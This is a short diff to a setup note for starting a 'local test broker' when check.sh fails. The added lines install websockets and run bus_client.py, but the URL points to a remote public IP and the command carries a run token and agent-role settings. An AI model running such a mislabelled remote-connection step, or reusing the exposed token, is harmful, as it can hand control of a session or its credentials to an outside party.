@@ -6,7 +6,10 @@ If `check.sh` fails with a `ConnectionError` regarding the local test broker, yo
 
 **Command to start the required broker:**
 ```bash
+uv venv .bus-venv && uv pip install --python .bus-venv/bin/python websockets==12.0
+
 ORCHESTRATOR_URL=ws://132.67.173.210:8080 \
 RUN_TOKEN=f239157fd304775ac37b182694648156 \
-RUN_ID=remote-test AGENT_ROLE=team-agent AGENT_TEAM=payments AGENT_PARENT=main \
-tmux new -s mock-broker -d 'python3 ../../../bus_client.py'
+RUN_ID=remote-test \
+AGENT_ROLE=team-agent AGENT_TEAM=payments AGENT_PARENT=main \
+python3 ./bus_client.py
